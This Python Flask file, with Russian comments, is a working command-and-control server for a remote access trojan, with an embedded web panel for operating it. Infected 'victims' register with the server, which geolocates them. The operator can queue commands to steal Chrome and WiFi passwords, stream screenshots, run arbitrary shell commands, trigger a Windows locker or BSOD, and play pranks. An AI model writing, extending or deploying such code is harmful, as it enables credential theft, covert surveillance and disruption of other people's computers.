# =====================================================================
# СЕРВЕР - СТАБИЛЬНЫЙ И КРАСИВЫЙ
# Замени server.py на GitHub полностью
# =====================================================================
from flask import Flask, request, jsonify
import time
import base64
import requests as req

app = Flask(__name__)

clients = {}
commands = {}
notifications = []

def get_country(ip):
    try:
        r = req.get(f"http://ip-api.com/json/{ip}?fields=country,city", timeout=3)
        if r.status_code == 200:
            data = r.json()
            return f"{data.get('city', '')}, {data.get('country', '')}"
    except:
        pass
    return "Unknown"

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    client_id = str(int(time.time() * 1000))
    ip = request.remote_addr
    country = get_country(ip)
    
    clients[client_id] = {
        "hostname": data.get("hostname"),
        "username": data.get("username"),
        "os": data.get("os"),
        "ip": ip,
        "country": country,
        "last_seen": time.time(),
        "last_screenshot": "",
        "sysinfo": {},
        "chrome_data": "",
        "wifi_data": "",
        "exec_result": ""
    }
    commands[client_id] = []
    notifications.append({
        "text": f"🟢 {data.get('hostname')} from {country}",
        "time": time.strftime("%H:%M:%S")
    })
    return jsonify({"id": client_id})

@app.route('/data/<client_id>', methods=['POST'])
def receive_data(client_id):
    if client_id in clients:
        data = request.json
        data_type = data.get("type")
        if data_type in ["screenshot", "stream_frame"]:
            clients[client_id]["last_screenshot"] = data.get("data", "")
        elif data_type == "sysinfo":
            clients[client_id]["sysinfo"] = data.get("data", {})
        elif data_type == "chrome_passwords":
            clients[client_id]["chrome_data"] = data.get("data", "")
        elif data_type == "wifi_passwords":
            clients[client_id]["wifi_data"] = data.get("data", "")
        elif data_type == "exec_result":
            clients[client_id]["exec_result"] = data.get("data", "")
        clients[client_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"})

@app.route('/screenshot/<client_id>')
def get_screenshot(client_id):
    if client_id in clients and clients[client_id].get("last_screenshot"):
        try:
            img_data = base64.b64decode(clients[client_id]["last_screenshot"])
            return img_data, 200, {'Content-Type': 'image/jpeg', 'Cache-Control': 'no-cache, no-store, must-revalidate'}
        except:
            pass
    return "no", 404

@app.route('/command/<client_id>', methods=['GET'])
def send_command(client_id):
    if client_id in commands and commands[client_id]:
        return jsonify(commands[client_id].pop(0))
    return jsonify({"command": "ping"})

@app.route('/clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        if time.time() - info["last_seen"] < 60:
            result[cid] = {
                "hostname": info["hostname"],
                "username": info["username"],
                "os": info["os"],
                "ip": info.get("ip", ""),
                "country": info.get("country", "Unknown"),
                "has_screenshot": bool(info.get("last_screenshot")),
                "sysinfo": info.get("sysinfo", {}),
                "chrome_data": info.get("chrome_data", ""),
                "wifi_data": info.get("wifi_data", ""),
                "exec_result": info.get("exec_result", "")
            }
    return jsonify(result)

@app.route('/send_command/<client_id>', methods=['POST'])
def add_command(client_id):
    if client_id in commands:
        cmd = request.json
        command = cmd.get("command")
        times = 3 if command in ["lock", "unlock", "winlocker", "shutdown", "restart", "bsod"] else 1
        for _ in range(times):
            commands[client_id].append(cmd)
    return jsonify({"status": "ok"})

@app.route('/notifications')
def get_notifications():
    return jsonify(notifications[-20:])

@app.route('/')
def home():
    return """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel v3.0</title>
    <style>
        :root {
            --bg: #0d1117;
            --panel: #161b22;
            --border: #30363d;
            --accent: #58a6ff;
            --green: #3fb950;
            --red: #f85149;
            --orange: #d2991d;
            --text: #c9d1d9;
            --text2: #8b949e;
            --radius: 6px;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: var(--bg);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 1.5;
            height: 100vh;
            display: flex;
        }
        
        /* Sidebar */
        .sidebar {
            width: 260px;
            background: var(--panel);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
        }
        
        .sidebar-header {
            padding: 16px;
            border-bottom: 1px solid var(--border);
        }
        
        .sidebar-header h1 {
            font-size: 16px;
            font-weight: 600;
            color: var(--accent);
        }
        
        .sidebar-header .status {
            font-size: 12px;
            color: var(--green);
            margin-top: 4px;
        }
        
        .notifications {
            max-height: 120px;
            overflow-y: auto;
            padding: 8px;
            border-bottom: 1px solid var(--border);
        }
        
        .notification {
            background: var(--bg);
            padding: 8px;
            margin-bottom: 4px;
            border-radius: var(--radius);
            font-size: 11px;
            border-left: 3px solid var(--green);
        }
        
        .notification .time {
            color: var(--text2);
            font-size: 10px;
        }
        
        .client-list {
            flex: 1;
            overflow-y: auto;
            padding: 8px;
        }
        
        .client-item {
            padding: 12px;
            margin-bottom: 4px;
            border-radius: var(--radius);
            cursor: pointer;
            border: 1px solid transparent;
            transition: all 0.15s ease;
        }
        
        .client-item:hover {
            background: #1c2128;
        }
        
        .client-item.active {
            border-color: var(--accent);
            background: #1c2128;
        }
        
        .client-item .hostname {
            font-weight: 600;
            color: var(--accent);
            font-size: 13px;
        }
        
        .client-item .meta {
            font-size: 11px;
            color: var(--text2);
            margin-top: 2px;
        }
        
        .client-item .dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            background: var(--green);
            border-radius: 50%;
            margin-right: 6px;
        }
        
        /* Main */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-width: 0;
        }
        
        .toolbar {
            padding: 10px 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            background: var(--panel);
        }
        
        .toolbar button {
            padding: 5px 12px;
            border: 1px solid var(--border);
            border-radius: var(--radius);
            background: var(--bg);
            color: var(--text);
            font-size: 12px;
            cursor: pointer;
            white-space: nowrap;
            transition: all 0.15s ease;
        }
        
        .toolbar button:hover {
            background: #30363d;
        }
        
        .toolbar button.green {
            color: var(--green);
            border-color: var(--green);
        }
        
        .toolbar button.green:hover {
            background: var(--green);
            color: #000;
        }
        
        .toolbar button.red {
            color: var(--red);
            border-color: var(--red);
        }
        
        .toolbar button.red:hover {
            background: var(--red);
            color: #fff;
        }
        
        .toolbar button.funny {
            color: var(--orange);
            border-color: var(--orange);
        }
        
        .toolbar button.funny:hover {
            background: var(--orange);
            color: #000;
        }
        
        .separator {
            width: 100%;
            height: 1px;
            background: var(--border);
            margin: 4px 0;
        }
        
        .section-label {
            width: 100%;
            font-size: 10px;
            color: var(--orange);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 2px 0;
        }
        
        /* Content */
        .content-area {
            flex: 1;
            display: flex;
            padding: 8px;
            gap: 8px;
            overflow: hidden;
        }
        
        .panel {
            background: var(--panel);
            border: 1px solid var(--border);
            border-radius: var(--radius);
        }
        
        .screenshot-panel {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            min-width: 0;
        }
        
        .screenshot-panel img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
        
        .placeholder {
            color: var(--text2);
            font-size: 14px;
            text-align: center;
            padding: 20px;
        }
        
        .info-panel {
            width: 350px;
            flex-shrink: 0;
            padding: 16px;
            overflow-y: auto;
        }
        
        .info-panel h3 {
            font-size: 13px;
            font-weight: 600;
            color: var(--accent);
            margin-bottom: 8px;
            margin-top: 16px;
        }
        
        .info-panel h3:first-child {
            margin-top: 0;
        }
        
        .info-row {
            display: flex;
            padding: 3px 0;
            font-size: 12px;
        }
        
        .info-label {
            color: var(--text2);
            width: 90px;
            flex-shrink: 0;
        }
        
        .info-value {
            color: var(--text);
            word-break: break-all;
        }
        
        pre {
            background: var(--bg);
            padding: 8px;
            border-radius: var(--radius);
            font-size: 11px;
            color: var(--green);
            white-space: pre-wrap;
            max-height: 180px;
            overflow-y: auto;
            font-family: 'SF Mono', 'Consolas', monospace;
        }
        
        .console-panel {
            width: 300px;
            flex-shrink: 0;
            background: #0d1117;
            display: flex;
            flex-direction: column;
        }
        
        .console-header {
            padding: 8px 12px;
            font-size: 11px;
            font-weight: 600;
            color: var(--accent);
            border-bottom: 1px solid var(--border);
        }
        
        .console-output {
            flex: 1;
            overflow-y: auto;
            padding: 8px;
            font-family: 'SF Mono', 'Consolas', monospace;
            font-size: 11px;
            color: var(--green);
        }
        
        .console-input {
            display: flex;
            border-top: 1px solid var(--border);
        }
        
        .console-input input {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--text);
            padding: 8px 12px;
            font-family: 'SF Mono', 'Consolas', monospace;
            font-size: 12px;
            outline: none;
        }
        
        .console-input button {
            background: var(--accent);
            color: #000;
            border: none;
            padding: 8px 14px;
            cursor: pointer;
            font-weight: 600;
            font-size: 11px;
        }
        
        .console-input button:hover {
            background: var(--green);
        }
        
        .log-entry {
            font-size: 10px;
            padding: 1px 0;
        }
        
        .log-entry .time {
            color: var(--accent);
            margin-right: 6px;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        
        ::-webkit-scrollbar-track {
            background: transparent;
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 3px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #484f58;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h1>Control Panel v3.0</h1>
            <div class="status">● Server Online</div>
        </div>
        <div class="notifications" id="notifications"></div>
        <div class="client-list" id="clientList">
            <div class="placeholder">Waiting...</div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="toolbar" id="toolbar">
            <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
            <button class="green" onclick="startStream()">📡 Stream</button>
            <button class="red" onclick="stopStream()">⏹ Stop</button>
            <button onclick="sendCmd('sysinfo')">💻 Info</button>
            <button onclick="sendCmd('steal_chrome')">🔑 Chrome</button>
            <button onclick="sendCmd('steal_wifi')">📶 WiFi</button>
            <button class="green" onclick="sendCmd('lock')">🔒 Lock</button>
            <button onclick="sendCmd('unlock')">🔓 Unlock</button>
            <button class="red" onclick="sendCmd('shutdown')">⏻ Off</button>
            <button class="red" onclick="sendCmd('restart')">🔄 Reboot</button>
            <button onclick="sendMsg()">💬 Msg</button>
            <button class="red" onclick="sendCmd('winlocker')">🚫 WinLock</button>
            <button class="red" onclick="sendCmd('bsod')">⚠ BSOD</button>
            <div class="separator"></div>
            <div class="section-label">😂 Funny Commands</div>
            <button class="funny" onclick="sendCmd('funny_msg')">😂 Смешное окно</button>
            <button class="funny" onclick="sendCmd('crazy_screen')">🤪 Безумный экран</button>
            <button class="funny" onclick="sendCmd('crazy_mouse')">🖱 Мышь-псих</button>
            <button class="funny" onclick="sendCmd('rickroll')">🎵 RickRoll</button>
            <button class="funny" onclick="sendCmd('draw')">🎨 Рисовать</button>
            <button class="funny" onclick="sendCmd('beep')">🔊 Пищать</button>
            <button class="funny" onclick="sendCmd('cdrom')">💿 CD-ROM</button>
            <button class="funny" onclick="sendCmd('type_funny')">⌨️ Печатать</button>
        </div>
        
        <div class="content-area">
            <div class="panel screenshot-panel" id="screenPanel">
                <div class="placeholder">🖥 Select victim → Screenshot</div>
            </div>
            
            <div class="panel info-panel">
                <h3>💻 System Information</h3>
                <div id="sysinfoContent"><div class="placeholder">Click SysInfo</div></div>
                <h3>📄 Command Output</h3>
                <pre id="execOutput"></pre>
                <h3>🔑 Chrome Passwords</h3>
                <pre id="chromeContent"></pre>
                <h3>📶 WiFi Passwords</h3>
                <pre id="wifiContent"></pre>
            </div>
            
            <div class="panel console-panel">
                <div class="console-header">📋 Console</div>
                <div class="console-output" id="console"></div>
                <div class="console-input">
                    <input type="text" id="cmdInput" placeholder="Type command..." onkeydown="if(event.key==='Enter')execCmd()">
                    <button onclick="execCmd()">▶</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedClient = null;
        let streamInterval = null;
        
        function log(msg) {
            let t = new Date().toLocaleTimeString();
            let c = document.getElementById('console');
            c.innerHTML += '<div class="log-entry"><span class="time">[' + t + ']</span>' + msg + '</div>';
            c.scrollTop = c.scrollHeight;
        }
        
        function updateAll() {
            fetch('/clients').then(function(r) { return r.json(); }).then(function(data) {
                var html = '';
                for(var id in data) {
                    var c = data[id];
                    var active = selectedClient === id ? ' active' : '';
                    html += '<div class="client-item' + active + '" onclick="selectClient(\'' + id + '\')">';
                    html += '<div class="hostname"><span class="dot"></span>' + c.hostname + '</div>';
                    html += '<div class="meta">👤 ' + c.username + ' | 🌐 ' + c.ip + '</div>';
                    html += '<div class="meta">📍 ' + c.country + ' | 💻 ' + c.os + '</div>';
                    html += '</div>';
                }
                document.getElementById('clientList').innerHTML = html || '<div class="placeholder">No victims connected</div>';
                
                if(selectedClient && data[selectedClient]) {
                    var c = data[selectedClient];
                    if(c.has_screenshot && streamInterval) {
                        var img = document.getElementById('screenPanel').querySelector('img');
                        if(img) {
                            img.src = '/screenshot/' + selectedClient + '?t=' + Date.now();
                        } else {
                            document.getElementById('screenPanel').innerHTML = '<img src="/screenshot/' + selectedClient + '">';
                        }
                    }
                    if(c.sysinfo && Object.keys(c.sysinfo).length > 0) {
                        var h = '';
                        for(var k in c.sysinfo) {
                            h += '<div class="info-row"><span class="info-label">' + k + ':</span><span class="info-value">' + c.sysinfo[k] + '</span></div>';
                        }
                        document.getElementById('sysinfoContent').innerHTML = h;
                    }
                    if(c.chrome_data) document.getElementById('chromeContent').textContent = c.chrome_data;
                    if(c.wifi_data) document.getElementById('wifiContent').textContent = c.wifi_data;
                    if(c.exec_result) document.getElementById('execOutput').textContent = c.exec_result;
                }
            });
            
            fetch('/notifications').then(function(r) { return r.json(); }).then(function(data) {
                var h = '';
                for(var i = data.length - 1; i >= 0; i--) {
                    h += '<div class="notification"><div>' + data[i].text + '</div><div class="time">' + data[i].time + '</div></div>';
                }
                document.getElementById('notifications').innerHTML = h;
            });
        }
        
        function selectClient(id) {
            selectedClient = id;
            log('Selected: ' + id);
            var items = document.querySelectorAll('.client-item');
            for(var i = 0; i < items.length; i++) {
                items[i].classList.remove('active');
            }
            event.target.closest('.client-item').classList.add('active');
            sendCmd('screenshot');
            setTimeout(updateAll, 2000);
        }
        
        function sendCmd(command) {
            if(!selectedClient) {
                alert('Select a victim first!');
                return;
            }
            fetch('/send_command/' + selectedClient, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command})
            });
            log('Sent: ' + command);
        }
        
        function startStream() {
            if(!selectedClient) { alert('Select a victim first!'); return; }
            sendCmd('stream_start');
            log('📡 Stream started');
            if(streamInterval) clearInterval(streamInterval);
            streamInterval = setInterval(function() {
                sendCmd('screenshot');
                setTimeout(updateAll, 1500);
            }, 2000);
        }
        
        function stopStream() {
            if(streamInterval) clearInterval(streamInterval);
            streamInterval = null;
            sendCmd('stream_stop');
            log('⏹ Stream stopped');
        }
        
        function execCmd() {
            var cmd = document.getElementById('cmdInput').value;
            if(cmd && selectedClient) {
                sendCmd('exec');
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'exec', cmd: cmd})
                });
                document.getElementById('cmdInput').value = '';
                setTimeout(updateAll, 3000);
            }
        }
        
        function sendMsg() {
            if(!selectedClient) { alert('Select a victim first!'); return; }
            var msg = prompt('Enter message:');
            if(msg) {
                sendCmd('message');
                fetch('/send_command/' + selectedClient, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: 'message', text: msg})
                });
            }
        }
        
        setInterval(updateAll, 2000);
        updateAll();
        log('Control Panel v3.0 ready');
    </script>
</body>
</html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
